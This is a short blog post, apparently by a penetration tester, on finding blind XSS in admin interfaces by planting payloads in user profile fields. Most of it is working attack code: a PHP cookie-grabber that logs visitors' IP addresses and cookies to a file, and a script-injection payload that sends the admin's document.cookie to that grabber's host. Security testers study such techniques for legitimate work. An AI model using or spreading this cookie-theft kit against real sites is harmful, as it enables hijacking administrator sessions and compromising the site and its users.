---
layout: post
title: Testing XSS in places where you can't see.
description: Some applications, there's more then one interface, one to the users and others to the admin, how do I can found a XSS on the admin area being just a regular user?
keywords: xss, owasp, php, payload, G4mbl3r
disqus: true
tags: [XSS]
categories: Web
---
#### The problem
It’s common to you find XSS vulnerabilities during an web pentests, but some times, you’re testing an application that contains more then one interface, like user interface and admin interface, so how you can test for xss on the admin interface being just a regular user? Well it’s kind of simple, but it's not a test to find all the xss on the admin page, for example, when you register on an application, there’s some informations you provide, like, name, address, bio and other things, so we can assume that the admin interface can read this informations, so we can just send XSS payloads, to try to get a XSS exploration, but not a payload like the most common,
{% highlight html %}
<script>alert('XSS')</script>
{% endhighlight %}

So to solve this problem we can use something like this, a php script to log the admin IP and Cookie,
{% highlight php %}
<?php
function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
}
$user_ip = getUserIP();
$cookie = $_GET['cookie'];
$fp = fopen('access.txt', 'a');
fwrite($fp, $user_ip ." : ".$cookie."\n");
fclose($fp);
?>
{% endhighlight %}

But how I'll get the admin cookie? it's simple, just make it on your XSS payload,
{% highlight html %}
<script>var s = document.createElement("script");s.type = "text/javascript";s.src = "http://localhost/grabber.php?cookie="+document.cookie;$("body").append(s);</script>
{% endhighlight %}

Basically this payload, will add a tag script on the page, with you server/script as source, and passing the document.cookie as value of parameter cookie of your script.

Now you can test XSS on interfaces where you can reach.
